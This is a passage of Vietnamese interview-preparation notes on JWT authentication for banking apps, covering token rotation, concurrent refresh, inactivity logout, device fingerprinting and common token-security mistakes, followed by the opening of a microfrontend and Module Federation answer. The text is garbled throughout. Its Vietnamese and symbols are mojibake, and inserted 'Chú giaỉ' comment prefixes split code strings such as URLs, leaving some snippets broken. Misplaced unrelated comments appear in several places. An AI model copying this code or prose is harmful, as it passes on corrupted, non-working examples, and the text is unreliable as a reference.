  const token = document.cookie; // Ch√∫ gi·∫£i: undefined (httpOnly)
  
 // Ch√∫ gi·∫£i: Cannot access! ‚úÖ Secure
</script>
```

**C. Token Rotation (Xoay V√≤ng Token):**

```typescript
 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: REFRESH TOKEN ROTATION
 // Ch√∫ gi·∫£i: ============================================

 // Ch√∫ gi·∫£i: Backend: M·ªói l·∫ßn refresh ‚Üí generate token m·ªõi
app.post('/auth/refresh', async (req, res) => {
  const oldRefreshToken = req.cookies.refreshToken;
  
 // Ch√∫ gi·∫£i: Verify old token
  const decoded = jwt.verify(oldRefreshToken, SECRET);
  
 // Ch√∫ gi·∫£i: Generate NEW Access Token
  const newAccessToken = jwt.sign({ ... }, SECRET, { expiresIn: '15m' });
  
 // Ch√∫ gi·∫£i: Generate NEW Refresh Token (rotation)
  const newRefreshToken = jwt.sign(
    { jti: uuidv4(), sub: decoded.sub },
    SECRET,
    { expiresIn: '30d' }
  );
  
 // Ch√∫ gi·∫£i: Revoke old Refresh Token
  await db.revokeRefreshToken(decoded.jti);
  
 // Ch√∫ gi·∫£i: Save new Refresh Token
  await db.saveRefreshToken(newRefreshToken);
  
 // Ch√∫ gi·∫£i: Set new Refresh Token cookie
  res.cookie('refreshToken', newRefreshToken, { httpOnly: true, ... });
  
 // Trong arrow function v·ªõi block `{ }` ph·∫£i d√πng `return` ƒë·ªÉ tr·∫£ gi√° tr·ªã; v·ªõi expression c√≥ th·ªÉ tr·∫£ ng·∫ßm (implicit return).
  res.json({ accessToken: newAccessToken });
});

// L·ª£i √≠ch:
 // Ch√∫ gi·∫£i: - M·ªói l·∫ßn refresh ‚Üí token m·ªõi
// - Old token b·ªã revoke ‚Üí kh√¥ng d√πng l·∫°i ƒë∆∞·ª£c
// - N·∫øu hacker c√≥ old token ‚Üí useless
// - Detect reuse attack (token revoked m√† v·∫´n d√πng)
```

---

#### **üîí 4. Special Cases (C√°c Tr∆∞·ªùng H·ª£p ƒê·∫∑c Bi·ªát)**

**A. Concurrent Requests (Nhi·ªÅu Request C√πng L√∫c):**

```typescript
 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: Problem: Race Condition
 // Ch√∫ gi·∫£i: ============================================

 // Ch√∫ gi·∫£i: User v·ª´a m·ªü 10 tabs, m·ªói tab g·ªçi API
// ‚Üí 10 requests c√πng l√∫c
// ‚Üí Token h·∫øt h·∫°n
// ‚Üí 10 refresh requests c√πng l√∫c ‚ùå

 // Ch√∫ gi·∫£i: ============================================
 // `Promise`: c√°ch bi·ªÉu di·ªÖn gi√° tr·ªã b·∫•t ƒë·ªìng b·ªô; d√πng `.then/.catch` ho·∫∑c `async/await` ƒë·ªÉ x·ª≠ l√Ω.
 // Ch√∫ gi·∫£i: ============================================

let refreshPromise: Promise<string> | null = null;

async function getValidToken(): Promise<string> {
  // N·∫øu token c√≤n hi·ªáu l·ª±c ‚Üí return lu√¥n
  if (accessToken && !isTokenExpired(accessToken)) {
    return accessToken;
  }
  
  // N·∫øu ƒëang refresh ‚Üí ch·ªù promise hi·ªán t·∫°i
  if (refreshPromise) {
    return await refreshPromise;
  }
  
  // T·∫°o promise m·ªõi ƒë·ªÉ refresh
  refreshPromise = refreshAccessToken().then((newToken) => {
    refreshPromise = null; // Ch√∫ gi·∫£i: Reset
    return newToken;
  });
  
  return await refreshPromise;
}

async function apiCall(url: string) {
  const token = await getValidToken(); // Ch√∫ gi·∫£i: Ch·ªù token valid
  
  return fetch(url, {
    headers: {
      'Authorization': `Bearer ${token}`,
    },
  });
}

// K·∫øt qu·∫£:
// - 10 requests ƒë·∫ßu ti√™n trigger refresh
// - Ch·ªâ 1 refresh request th·ª±c s·ª± g·ª≠i ƒëi
// - 9 requests c√≤n l·∫°i ch·ªù promise ƒë√≥
// - T·∫•t c·∫£ d√πng chung 1 token m·ªõi
```

**B. Inactivity Timeout (T·ª± ƒê·ªông Logout Khi Kh√¥ng Ho·∫°t ƒê·ªông):**

```typescript
 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: AUTO LOGOUT AFTER INACTIVITY
// (Banking/Trading y√™u c·∫ßu)
 // Ch√∫ gi·∫£i: ============================================

class InactivityTimer {
  private timeout: number = 5 * 60 * 1000;  // 5 ph√∫t kh√¥ng ho·∫°t ƒë·ªông
  private timer: NodeJS.Timeout | null = null;
  
  constructor() {
    this.startTimer();
    this.listenActivity();
  }
  
  // B·∫Øt ƒë·∫ßu ƒë·∫øm
  private startTimer() {
    this.clearTimer();
    
    this.timer = setTimeout(() => {
      this.onTimeout();
    }, this.timeout);
  }
  
  // Reset timer khi c√≥ activity
  private resetTimer() {
    this.startTimer();
  }
  
  // L·∫Øng nghe user activity
  private listenActivity() {
    const events = ['mousedown', 'keydown', 'scroll', 'touchstart'];
    
    events.forEach((event) => {
      document.addEventListener(event, () => {
        this.resetTimer();
      }, { passive: true });
    });
  }
  
 // Ch√∫ gi·∫£i: Timeout ‚Üí logout
  private onTimeout() {
    console.log('Inactivity timeout - logging out');
    
 // Ch√∫ gi·∫£i: Show warning dialog
    showWarningDialog('B·∫°n ƒë√£ kh√¥ng ho·∫°t ƒë·ªông trong 5 ph√∫t. Vui l√≤ng ƒëƒÉng nh·∫≠p l·∫°i.');
    
 // Ch√∫ gi·∫£i: Logout
    logout();
  }
  
  private clearTimer() {
    if (this.timer) {
      clearTimeout(this.timer);
      this.timer = null;
    }
  }
}

 // Ch√∫ gi·∫£i: Usage:
const inactivityTimer = new InactivityTimer();
```

**C. Device Fingerprinting (Nh·∫≠n Di·ªán Thi·∫øt B·ªã):**

```typescript
 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: DEVICE FINGERPRINTING
 // Ch√∫ gi·∫£i: ============================================

function getDeviceFingerprint(): string {
  const data = {
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    screenResolution: `${screen.width}x${screen.height}`,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    colorDepth: screen.colorDepth,
    cpuCores: navigator.hardwareConcurrency,
  };
  
 // Ch√∫ gi·∫£i: Hash fingerprint
  const fingerprint = hashSHA256(JSON.stringify(data));
  return fingerprint;
}

 // Ch√∫ gi·∫£i: Backend: Verify device
app.post('/auth/login', async (req, res) => {
  const { deviceId } = req.body;
  const user = await db.findUser(...);
  
  // Check device ƒë√£ ƒëƒÉng k√Ω ch∆∞a
  const knownDevice = await db.findDevice(user.id, deviceId);
  
  if (!knownDevice) {
    // Thi·∫øt b·ªã m·ªõi ‚Üí send OTP/email verification
    await sendOTPEmail(user.email);
    
    return res.status(403).json({
      error: 'Unknown device',
      requireOTP: true,
    });
  }
  
 // Ch√∫ gi·∫£i: Device OK ‚Üí proceed login
 // Ch√∫ gi·∫£i: ...
});
```

**D. Logout All Devices (ƒêƒÉng Xu·∫•t T·∫•t C·∫£ Thi·∫øt B·ªã):**

```typescript
 // Ch√∫ gi·∫£i: ============================================
 // Ch√∫ gi·∫£i: LOGOUT ALL DEVICES
 // Ch√∫ gi·∫£i: ============================================

 // Ch√∫ gi·∫£i: Frontend: Trigger logout all
async function logoutAllDevices() {
  await fetch('https: // Ch√∫ gi·∫£i: api.bank.com/auth/logout-all', {
    method: 'POST',
    credentials: 'include',
  });
  
 // Ch√∫ gi·∫£i: Redirect to login
  window.location.href = '/login';
}

 // Ch√∫ gi·∫£i: Backend: Revoke all refresh tokens
app.post('/auth/logout-all', authenticateToken, async (req, res) => {
  const userId = req.user.sub;
  
 // Ch√∫ gi·∫£i: Revoke t·∫•t c·∫£ refresh tokens c·ªßa user
  await db.revokeAllRefreshTokens(userId);
  
 // Ch√∫ gi·∫£i: Log event
  await logEvent({
    type: 'LOGOUT_ALL_DEVICES',
    userId,
    timestamp: new Date(),
  });
  
  res.json({ message: 'Logged out from all devices' });
});

 // Ch√∫ gi·∫£i: Use case:
 // Ch√∫ gi·∫£i: - User nghi ng·ªù account b·ªã hack
 // Ch√∫ gi·∫£i: - Change password ‚Üí logout all devices
 // Ch√∫ gi·∫£i: - Admin revoke access
```

---

#### **‚ö†Ô∏è 5. Common Security Mistakes (L·ªói B·∫£o M·∫≠t Th∆∞·ªùng G·∫∑p)**

```typescript
 // Ch√∫ gi·∫£i: ‚ùå L·ªñI 1: L∆∞u token trong localStorage
localStorage.setItem('accessToken', token); // Ch√∫ gi·∫£i: XSS risk!

// ‚úÖ ƒê√öNG: L∆∞u trong memory
let accessToken: string | null = null;

 // Ch√∫ gi·∫£i: ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ

// ‚ùå L·ªñI 2: Access Token th·ªùi h·∫°n qu√° d√†i
jwt.sign(payload, secret, { expiresIn: '30d' });  // Qu√° l√¢u!

// ‚úÖ ƒê√öNG: 5-15 ph√∫t
jwt.sign(payload, secret, { expiresIn: '15m' });

 // Ch√∫ gi·∫£i: ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ

// ‚ùå L·ªñI 3: Kh√¥ng verify token signature
const decoded = jwt.decode(token);  // ‚ùå Ch·ªâ decode, kh√¥ng verify!

// ‚úÖ ƒê√öNG: Verify signature
jwt.verify(token, secret, (err, decoded) => { ... });

 // Ch√∫ gi·∫£i: ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ

// ‚ùå L·ªñI 4: Kh√¥ng revoke refresh token khi logout
// User logout ‚Üí token v·∫´n valid ‚Üí hacker d√πng ƒë∆∞·ª£c

// ‚úÖ ƒê√öNG: Revoke token v√†o database blacklist
await db.revokeRefreshToken(tokenId);

 // Ch√∫ gi·∫£i: ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ

 // Ch√∫ gi·∫£i: ‚ùå L·ªñI 5: G·ª≠i sensitive data trong token
jwt.sign({
  password: user.password, // Ch√∫ gi·∫£i: ‚ùå NEVER!
  creditCard: user.creditCard, // Ch√∫ gi·∫£i: ‚ùå NEVER!
}, secret);

// ‚úÖ ƒê√öNG: Ch·ªâ non-sensitive data
jwt.sign({
  sub: user.id,
  name: user.name,
  role: user.role,
}, secret);

 // Ch√∫ gi·∫£i: ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ

// ‚ùå L·ªñI 6: Kh√¥ng check token blacklist
 // Ch√∫ gi·∫£i: Token b·ªã revoke nh∆∞ng v·∫´n accept

// ‚úÖ ƒê√öNG: Check blacklist
const tokenRecord = await db.findRefreshToken(tokenId);
if (!tokenRecord || tokenRecord.isRevoked) {
  return res.status(403).json({ error: 'Token revoked' });
}

 // Ch√∫ gi·∫£i: ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ

// ‚ùå L·ªñI 7: Kh√¥ng rate limit refresh endpoint
 // Ch√∫ gi·∫£i: Hacker brute force refresh endpoint

// ‚úÖ ƒê√öNG: Rate limit
app.use('/auth/refresh', rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 ph√∫t
  max: 10, // Ch√∫ gi·∫£i: Max 10 requests
}));

 // Ch√∫ gi·∫£i: ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ

// ‚ùå L·ªñI 8: Kh√¥ng log security events
// Kh√¥ng bi·∫øt khi n√†o b·ªã attack

// ‚úÖ ƒê√öNG: Log everything
await logEvent({
  type: 'LOGIN_FAILED',
  username,
  ipAddress: req.ip,
  reason: 'Invalid password',
  timestamp: new Date(),
});
```

---

#### **üìä 6. Complete Flow Diagram**

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ           COMPLETE AUTHENTICATION FLOW                             ‚îÇ
‚îÇ      (Banking/Trading System - H·ªá Th·ªëng Ng√¢n H√†ng)                ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

1Ô∏è‚É£ LOGIN
   User                     Frontend                Backend
    ‚îÇ                          ‚îÇ                       ‚îÇ
    ‚îÇ‚îÄ‚îÄ‚îÄ Enter credentials ‚îÄ‚îÄ‚Üí‚îÇ                       ‚îÇ
    ‚îÇ                          ‚îÇ‚îÄ‚îÄ‚îÄ POST /login ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚Üí‚îÇ
    ‚îÇ                          ‚îÇ    {username, pwd}    ‚îÇ
    ‚îÇ                          ‚îÇ                       ‚îÇ
    ‚îÇ                          ‚îÇ                       ‚îÇ‚îÄ Verify credentials
    ‚îÇ                          ‚îÇ                       ‚îÇ‚îÄ Generate tokens
    ‚îÇ                          ‚îÇ                       ‚îÇ‚îÄ Save refresh token
    ‚îÇ                          ‚îÇ                       ‚îÇ
    ‚îÇ                          ‚îÇ‚Üê‚îÄ Set-Cookie ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÇ
    ‚îÇ                          ‚îÇ   refreshToken        ‚îÇ
    ‚îÇ                          ‚îÇ   (httpOnly)          ‚îÇ
    ‚îÇ                          ‚îÇ                       ‚îÇ
    ‚îÇ                          ‚îÇ‚Üê‚îÄ { accessToken } ‚îÄ‚îÄ‚îÄ‚îÇ
    ‚îÇ‚Üê‚îÄ Redirect /dashboard ‚îÄ‚îÇ                       ‚îÇ
    ‚îÇ                          ‚îÇ                       ‚îÇ
    ‚îî‚îÄ accessToken in memory  ‚îÇ                       ‚îÇ

2Ô∏è‚É£ API CALL
   User                     Frontend                Backend
    ‚îÇ                          ‚îÇ                       ‚îÇ
    ‚îÇ‚îÄ‚îÄ‚îÄ Click "View Balance"‚Üí‚îÇ                       ‚îÇ
    ‚îÇ                          ‚îÇ‚îÄ GET /balance ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚Üí‚îÇ
    ‚îÇ                          ‚îÇ   Authorization:      ‚îÇ
    ‚îÇ                          ‚îÇ   Bearer <token>      ‚îÇ
    ‚îÇ                          ‚îÇ                       ‚îÇ
    ‚îÇ                          ‚îÇ                       ‚îÇ‚îÄ Verify token
    ‚îÇ                          ‚îÇ                       ‚îÇ‚îÄ Check permissions
    ‚îÇ                          ‚îÇ                       ‚îÇ
    ‚îÇ                          ‚îÇ‚Üê‚îÄ { balance: 1M } ‚îÄ‚îÄ‚îÄ‚îÇ
    ‚îÇ‚Üê‚îÄ Display balance ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÇ                       ‚îÇ

3Ô∏è‚É£ TOKEN REFRESH (Auto - m·ªói 14 ph√∫t)
   Frontend                Backend
      ‚îÇ                       ‚îÇ
      ‚îÇ‚îÄ POST /auth/refresh ‚Üí‚îÇ
      ‚îÇ   Cookie:             ‚îÇ
      ‚îÇ   refreshToken        ‚îÇ
      ‚îÇ                       ‚îÇ
      ‚îÇ                       ‚îÇ‚îÄ Verify refresh token
      ‚îÇ                       ‚îÇ‚îÄ Check not revoked
      ‚îÇ                       ‚îÇ‚îÄ Generate new access token
      ‚îÇ                       ‚îÇ
      ‚îÇ‚Üê‚îÄ { accessToken } ‚îÄ‚îÄ‚îÄ‚îÇ
      ‚îÇ                       ‚îÇ
   Update accessToken         ‚îÇ
   in memory                  ‚îÇ

4Ô∏è‚É£ LOGOUT
   User                     Frontend                Backend
    ‚îÇ                          ‚îÇ                       ‚îÇ
    ‚îÇ‚îÄ‚îÄ‚îÄ Click "Logout" ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚Üí‚îÇ                       ‚îÇ
    ‚îÇ                          ‚îÇ‚îÄ POST /logout ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚Üí‚îÇ
    ‚îÇ                          ‚îÇ   Cookie:             ‚îÇ
    ‚îÇ                          ‚îÇ   refreshToken        ‚îÇ
    ‚îÇ                          ‚îÇ                       ‚îÇ
    ‚îÇ                          ‚îÇ                       ‚îÇ‚îÄ Revoke token
    ‚îÇ                          ‚îÇ                       ‚îÇ‚îÄ Clear cookie
    ‚îÇ                          ‚îÇ                       ‚îÇ
    ‚îÇ                          ‚îÇ‚Üê‚îÄ { success } ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÇ
    ‚îÇ                          ‚îÇ                       ‚îÇ
    ‚îÇ                          ‚îÇ‚îÄ accessToken = null   ‚îÇ
    ‚îÇ                          ‚îÇ‚îÄ Clear localStorage   ‚îÇ
    ‚îÇ‚Üê‚îÄ Redirect /login ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÇ                       ‚îÇ
```

---

#### **üí° Summary (T√≥m T·∫Øt)**

**Access Token üîë**
- **15 ph√∫t**, l∆∞u **memory**, d√πng g·ªçi API
- M·∫•t khi refresh page ‚Üí re-fetch t·ª´ refresh token

**Refresh Token üîÑ**
- **30 ng√†y**, l∆∞u **httpOnly cookie**, d√πng l·∫•y access token
- Secure: httpOnly + Secure + SameSite=Strict

**Best Practices üõ°Ô∏è**
- ‚úÖ Never localStorage (XSS risk)
- ‚úÖ httpOnly cookie cho refresh token
- ‚úÖ Short-lived access token (15 ph√∫t)
- ‚úÖ Token rotation (refresh ‚Üí new token)
- ‚úÖ Revoke tokens khi logout
- ‚úÖ Rate limiting
- ‚úÖ Inactivity timeout (5-10 ph√∫t)
- ‚úÖ Device fingerprinting
- ‚úÖ Audit logging

**Khi N√†o Logout:**
- User click logout ‚úÖ
- Inactivity > 5 ph√∫t ‚úÖ
- Refresh token expired ‚úÖ
- Suspicious activity detected ‚úÖ
- User change password ‚úÖ
- Admin revoke access ‚úÖ

**Khi N√†o Gi·ªØ Session:**
- User ƒëang ho·∫°t ƒë·ªông (reset timer)
- Refresh token c√≤n valid
- Device trusted
- No security alerts

**Key Takeaway:**
- **Banking/Trading** y√™u c·∫ßu b·∫£o m·∫≠t C·ª∞C CAO
- **2 tokens** (access + refresh) = balance gi·ªØa UX v√† security
- **httpOnly cookie** = ch·ªëng XSS
- **Short-lived tokens** = gi·∫£m impact khi leak
- **Audit logging** = detect suspicious activities
- **Multi-factor** everything (MFA, device fingerprint, inactivity timeout)
---
## 44. üß± Q44: Microfrontend & Monorepo - Module Federation, Multi-Framework, Communication Patterns  

**P1: T√™n c√¢u h·ªèi:** üß± Q44: Microfrontend & Monorepo - Module Federation, Multi-Framework, Communication Patterns  

**P2: Tr·∫£ l·ªùi (Senior):**

## **‚≠ê T√ìM T·∫ÆT CHO PH·ªéNG V·∫§N SENIOR/STAFF**

### **üéØ C√¢u Tr·∫£ L·ªùi Ng·∫Øn G·ªçn (3-4 ph√∫t):**

**"Microfrontend = chia app l·ªõn th√†nh nhi·ªÅu apps nh·ªè ƒë·ªôc l·∫≠p. Module Federation = runtime integration (share code, no rebuild).**

**üèóÔ∏è Microfrontend Architecture:**
- **Concept**: M·ªói team s·ªü h·ªØu 1 microfrontend (MFE) ‚Üí deploy ƒë·ªôc l·∫≠p ‚Üí tech stack ri√™ng.
- **Runtime Integration**: MFEs load at runtime (kh√¥ng ph·∫£i build time) ‚Üí independent releases.
- **Shell App (Host)**: Container app load remote MFEs.

**üîß Module Federation (Webpack 5 / Vite):**
- **Expose**: MFE expose components/modules.
  ```js
 // Ch√∫ gi·∫£i: microfrontend-a/webpack.config.js
  new ModuleFederationPlugin({
    name: 'mfeA',
    filename: 'remoteEntry.js',
    exposes: { './Button': './src/Button' }
  });
  ```
- **Consume**: Host import remote modules.
  ```js
 // Ch√∫ gi·∫£i: shell/webpack.config.js
  new ModuleFederationPlugin({
    remotes: { mfeA: 'mfeA@http: // Ch√∫ gi·∫£i: localhost:3001/remoteEntry.js' }
  });
 // Ch√∫ gi·∫£i: Usage
  const Button = lazy(() => import('mfeA/Button'));
  ```
- **Shared Dependencies**: Share React, libraries ‚Üí load once (not duplicate).
  ```js
  shared: { react: { singleton: true }, 'react-dom': { singleton: true } }
  ```

**‚ôªÔ∏è Communication Patterns:**
1. **Props/Callbacks**: Parent pass props to child MFE ‚Üí simple, tightly coupled.
2. **Custom Events**: `window.dispatchEvent()` ‚Üí loose coupling.
3. **State Management**: Shared Zustand/Redux store ‚Üí sync state across MFEs.
4. **PubSub**: Event bus (RxJS) ‚Üí publish/subscribe pattern.

**üéØ Multi-Framework Support:**
- **React + Vue + Angular**: M·ªói MFE d√πng framework kh√°c nhau.
- **Web Components**: Wrap MFEs trong custom elements ‚Üí framework-agnostic.
  ```js
 // Ch√∫ gi·∫£i: mfe-vue wrapped as <vue-widget>
  customElements.define('vue-widget', VueWidgetElement);
 // Ch√∫ gi·∫£i: Use in React
  <vue-widget data={data} />
  ```

**üîë Monorepo (Nx / Turborepo):**
- **Concept**: 1 repo ch·ª©a multiple projects ‚Üí shared tooling, dependencies.
- **Benefits**:
  - Atomic commits across projects.
  - Shared libraries, utilities.
  - Consistent tooling (ESLint, Prettier, TypeScript configs).
  - Dependency graph ‚Üí build ch·ªâ affected projects.
- **Tools**: Nx (Angular ecosystem), Turborepo (Vercel), Lerna (legacy).

**‚ö†Ô∏è Trade-offs:**

| Aspect | Monolith | Microfrontend |
|--------|----------|---------------|
| **Complexity** | Low | High (orchestration, communication) |
| **Build Time** | Slow (1 large app) | Fast (parallel builds) |
| **Deploy** | All-or-nothing | Independent per MFE |
| **Team Autonomy** | Low (shared codebase) | High (own tech stack) |
| **Bundle Size** | Optimized | Risk of duplication |
| **Developer Experience** | Simple | Complex (tooling, debugging) |

**üí° Senior Insights:**
- **When to use MFE**: Large teams (10+ devs), independent releases critical, different domains (e-commerce: catalog, checkout, profile).
- **When NOT to use**: Small teams, simple apps, tight coupling between features.
- **Module Federation vs Iframe**: MF = shared dependencies, better performance. Iframe = total isolation but clunky UX.
- **Styling Isolation**: CSS Modules, Shadow DOM, CSS-in-JS (styled-components) ‚Üí prevent style conflicts.
- **Routing**: Each MFE handle own routes + Shell sync URL state.

**üöÄ Real-World Example (E-commerce):**
```
Shell (Host App)
‚îú‚îÄ‚îÄ Product Catalog MFE (Team A - React)
‚îú‚îÄ‚îÄ Shopping Cart MFE (Team B - Vue)
‚îú‚îÄ‚îÄ Checkout MFE (Team C - Angular)
‚îî‚îÄ‚îÄ User Profile MFE (Team D - React)
```
- Team A deploy catalog update ‚Üí kh√¥ng ·∫£nh h∆∞·ªüng Teams B, C, D.
- Shared: React, UI library (button, input) via Module Federation.

---

**‚ùì C√¢u H·ªèi:**

Gi·∫£i th√≠ch chi ti·∫øt ki·∫øn tr√∫c Microfrontend v√† Monorepo, bao g·ªìm Module Federation (Webpack/Vite), Multi-framework development, Communication patterns, Routing strategies, v√† Styling isolation. Ph√¢n t√≠ch ∆∞u nh∆∞·ª£c ƒëi·ªÉm v√† ·ª©ng d·ª•ng th·ª±c t·∫ø.

**üìö Ph·∫ßn 1: Kh√°i Ni·ªám C∆° B·∫£n (Core Concepts)**

#### **üí° Microfrontend L√† G√¨? (What is Microfrontend?)**

**Microfrontend** l√† ki·∫øn tr√∫c chia ·ª©ng d·ª•ng frontend l·ªõn th√†nh **nhi·ªÅu ·ª©ng d·ª•ng nh·ªè ƒë·ªôc l·∫≠p**, m·ªói ·ª©ng d·ª•ng:
- ‚úÖ ƒê∆∞·ª£c ph√°t tri·ªÉn b·ªüi **team ri√™ng** (ƒë·ªôc l·∫≠p)
- ‚úÖ Deploy **ri√™ng bi·ªát** (independent deployment)
- ‚úÖ C√≥ **technology stack ri√™ng** (React, Vue, Angular, etc.)
- ‚úÖ **Runtime integration** (gh√©p n·ªëi l√∫c runtime, kh√¥ng ph·∫£i build time)

---

#### **üî• T·∫°i Sao C·∫ßn Microfrontend? (Why Microfrontend?)**

**üíî V·∫•n ƒê·ªÅ C·ªßa Monolithic Frontend (The Problem):**

```typescript
 // Ch√∫ gi·∫£i: ===================================================
// ‚ùå MONOLITHIC FRONTEND - V√ç D·ª§ TH·ª∞C T·∫æ
 // Ch√∫ gi·∫£i: ===================================================

// T√¨nh hu·ªëng: C√¥ng ty e-commerce l·ªõn v·ªõi 1 app React kh·ªïng l·ªì

üì¶ ecommerce-app/
‚îú‚îÄ‚îÄ src/
‚îÇ   ‚îú‚îÄ‚îÄ pages/
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ ProductCatalog/      ‚Üê Team A maintain (10 devs)
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ ShoppingCart/        ‚Üê Team B maintain (8 devs)
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ Checkout/            ‚Üê Team C maintain (12 devs)
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ UserProfile/         ‚Üê Team D maintain (6 devs)
‚îÇ   ‚îÇ   ‚îú‚îÄ‚îÄ OrderHistory/        ‚Üê Team E maintain (5 devs)
‚îÇ   ‚îÇ   ‚îî‚îÄ‚îÄ AdminDashboard/      ‚Üê Team F maintain (8 devs)
‚îÇ   ‚îÇ
‚îÇ   ‚îî‚îÄ‚îÄ package.json             ‚Üê 1 file duy nh·∫•t cho t·∫•t c·∫£!
‚îÇ       dependencies: {
‚îÇ         "react": "17.0.0",     ‚Üê Team A mu·ªën upgrade React 18
‚îÇ         "redux": "4.0.0",      ‚Üê Team C mu·ªën d√πng Zustand
‚îÇ         ...500 dependencies    ‚Üê C√†i ƒë·∫∑t CH·∫¨M (5-10 ph√∫t!)
‚îÇ       }
```

**‚ùå V·∫•n ƒê·ªÅ 1: DEPLOYMENT HELL (ƒê·ªãa Ng·ª•c Deploy)**

```
